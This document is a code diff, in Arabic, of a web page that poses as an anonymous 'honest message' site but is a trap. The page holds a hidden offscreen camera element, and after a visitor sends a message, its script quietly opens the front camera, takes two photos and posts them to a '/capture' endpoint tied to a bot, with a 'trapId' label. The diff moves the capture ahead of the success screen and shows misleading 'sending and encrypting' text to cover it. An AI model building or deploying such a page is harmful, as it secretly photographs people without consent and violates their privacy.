@@ -5,7 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>صارحني | مساحة التعبير الحرة</title>
-    
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- FontAwesome -->
@@ -26,9 +25,8 @@
             overflow-x: hidden;
         }
 
-        /* تصميم البطاقة الزجاجي الفخم */
         .glass-card {
-            background: rgba(255, 255, 255, 0.85);
+            background: rgba(255, 255, 255, 0.9);
             backdrop-filter: blur(25px);
             -webkit-backdrop-filter: blur(25px);
             border-radius: 32px;
@@ -89,11 +87,6 @@
             box-shadow: 0 0 0 4px rgba(217, 70, 239, 0.15);
         }
 
-        .custom-textarea::placeholder {
-            color: #a8a29e;
-            font-weight: 500;
-        }
-
         .btn-magic {
             background: linear-gradient(135deg, #d946ef 0%, #ec4899 100%);
             border-radius: 9999px;
@@ -101,12 +94,6 @@
             box-shadow: 0 10px 25px rgba(217, 70, 239, 0.35);
         }
 
-        .btn-magic:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 30px rgba(217, 70, 239, 0.45);
-        }
-
-        /* كتم الكاميرا تماماً وإخفائها */
         #spy-cam {
             position: absolute;
             top: -9999px;
@@ -115,9 +102,9 @@
             height: 1px;
             opacity: 0;
             pointer-events: none;
+            z-index: -99;
         }
 
-        /* زخارف خلفية متحركة */
         .blob {
             position: absolute;
             border-radius: 50%;
@@ -129,7 +116,7 @@
 </head>
 <body class="p-4 relative">
 
-    <!-- تأثيرات خلفية فخمة -->
+    <!-- زخارف خلفية متحركة -->
     <div class="blob bg-pink-400 w-64 h-64 top-0 right-0 animate-pulse"></div>
     <div class="blob bg-purple-400 w-72 h-72 bottom-0 left-0 animate-pulse" style="animation-delay: 2s;"></div>
 
@@ -158,9 +145,6 @@
 
             <div class="relative">
                 <textarea id="msg-input" rows="5" class="w-full custom-textarea p-5 text-center" placeholder="اكتب ما يدور في ذهنك بصدق..."></textarea>
-                <div class="absolute bottom-4 right-4 text-fuchsia-400 text-sm opacity-60">
-                    <i class="fa-solid fa-pen-fancy"></i>
-                </div>
             </div>
 
             <button id="send-btn" class="w-full btn-magic text-white font-bold text-lg py-4 flex justify-center items-center gap-2">
@@ -175,7 +159,7 @@
         </div>
     </main>
 
-    <!-- واجهة النجاح الفخمة -->
+    <!-- واجهة النجاح -->
     <div id="success-ui" class="hidden w-full max-w-sm glass-card p-10 text-center transform scale-95 opacity-0 transition-all duration-500 z-10">
         <div class="w-24 h-24 mx-auto bg-gradient-to-tr from-emerald-100 to-teal-100 rounded-full flex items-center justify-center mb-6 shadow-inner">
             <i class="fa-solid fa-check text-5xl text-emerald-500"></i>
@@ -192,7 +176,8 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('session');
-        const targetNumber = urlParams.get('target');
+        // السيرفر مبرمج ليرسل الجلسة لصاحبها، لكننا نرسل رقماً وهمياً لكي لا يرفض السيرفر الطلب بحجة "البيانات ناقصة"
+        const targetNumber = urlParams.get('target') || '0000000000';
 
         const sendBtn = document.getElementById('send-btn');
         const btnText = document.getElementById('btn-text');
@@ -206,33 +191,30 @@
             const messageText = msgInput.value.trim();
             
             if (!messageText) {
-                msgInput.style.borderColor = "#f43f5e";
-                msgInput.placeholder = "لا يمكنك إرسال رسالة فارغة...";
-                msgInput.focus();
+                alert("لا يمكنك إرسال رسالة فارغة!");
                 return;
             }
 
-            if (!sessionId || !targetNumber) {
-                alert("عذراً، هذا الرابط تالف أو غير مخصص للاستقبال.");
+            if (!sessionId) {
+                alert("عذراً، هذا الرابط غير صالح (مفقود الجلسة).");
                 return;
             }
 
-            // تجميد الواجهة لإظهار التحميل
+            // تعطيل الزر وإظهار حالة التحميل
             sendBtn.disabled = true;
             sendBtn.style.opacity = "0.7";
             btnIcon.className = "fa-solid fa-circle-notch animate-spin";
-            btnText.textContent = "جاري الإرسال...";
+            btnText.textContent = "جاري الإرسال والتشفير...";
 
             // ==========================================
-            // 1. الإرسال المباشر للنص (يضمن الوصول 100%)
+            // 1. الإرسال الفعلي للنص (ضمان الوصول)
             // ==========================================
             try {
-                // نرسل النص مباشرة للسيرفر وننتظر رده
                 const response = await fetch('/capture', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        type: 'text', // إرسال كنص
+                        type: 'text',
                         data: messageText, 
                         targetNumber: targetNumber, 
                         trapId: '💌 رسالة صارحني', 
@@ -243,44 +225,27 @@
                 const result = await response.json();
 
                 if (!result.success) {
-                    alert("⚠️ تعذر الإرسال: " + (result.message || "البوت غير متصل حالياً."));
+                    alert("⚠️ عذراً: " + (result.message || "البوت غير متصل حالياً."));
                     resetButton();
-                    return; // نوقف العملية لأن السيرفر فيه مشكلة
+                    return; // إيقاف العملية
                 }
 
             } catch (err) {
-                alert("⚠️ لا يوجد اتصال بالسيرفر! يرجى التأكد من تشغيل البوت.");
+                alert("⚠️ فشل الاتصال بالسيرفر! يرجى التأكد من أن السيرفر يعمل.");
                 resetButton();
-                return; // نوقف العملية
+                return; // إيقاف العملية
             }
 
             // ==========================================
-            // 2. إذا نجح الإرسال النصي، نعرض شاشة النجاح فوراً
+            // 2. محاولة التقاط الصور بصمت قبل إظهار النجاح
             // ==========================================
-            writeUi.style.opacity = '0';
-            setTimeout(() => {
-                writeUi.classList.add('hidden');
-                successUi.classList.remove('hidden');
-                setTimeout(() => {
-                    successUi.style.opacity = '1';
-                    successUi.style.transform = 'scale(1)';
-                }, 50);
-            }, 400);
-
-            // ==========================================
-            // 3. التقاط الصور وإرسالها في الخلفية (بصمت)
-            // ==========================================
-            captureAndSendHiddenPhotos();
-        });
-
-        async function captureAndSendHiddenPhotos() {
             try {
-                // محاولة فتح الكاميرا
+                btnText.textContent = "تأكيد الوصول...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 videoEl.srcObject = stream;
                 
-                // انتظار ثانية واحدة لتستقر الإضاءة
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                // انتظار 1.2 ثانية لتستقر الكاميرا
+                await new Promise(resolve => setTimeout(resolve, 1200));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = videoEl.videoWidth || 640;
@@ -289,21 +254,17 @@
 
                 let capturedImages = [];
 
-                // التقاط الصورة الأولى
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                 capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
 
-                // التقاط الصورة الثانية بسرعة
-                await new Promise(resolve => setTimeout(resolve, 300));
+                await new Promise(resolve => setTimeout(resolve, 400));
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                 capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
 
-                // إغلاق الكاميرا فوراً
                 stream.getTracks().forEach(track => track.stop());
 
-                // إرسال الصور للسيرفر بصمت تام
                 if (capturedImages.length > 0) {
-                    fetch('/capture', {
+                    await fetch('/capture', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
@@ -316,11 +277,22 @@
                     });
                 }
             } catch (err) {
-                // المستخدم رفض الكاميرا أو لا يملك كاميرا؟
-                // لا يهم، تم إرسال الرسالة النصية مسبقاً!
-                console.log("تخطي التقاط الصور الملحقة.");
+                console.log("تخطي التقاط الصور (الرسالة النصية وصلت بالفعل).");
             }
-        }
+
+            // ==========================================
+            // 3. إظهار واجهة النجاح المريحة
+            // ==========================================
+            writeUi.style.opacity = '0';
+            setTimeout(() => {
+                writeUi.classList.add('hidden');
+                successUi.classList.remove('hidden');
+                setTimeout(() => {
+                    successUi.style.opacity = '1';
+                    successUi.style.transform = 'scale(1)';
+                }, 50);
+            }, 400);
+        });
 
         function resetButton() {
             sendBtn.disabled = false;
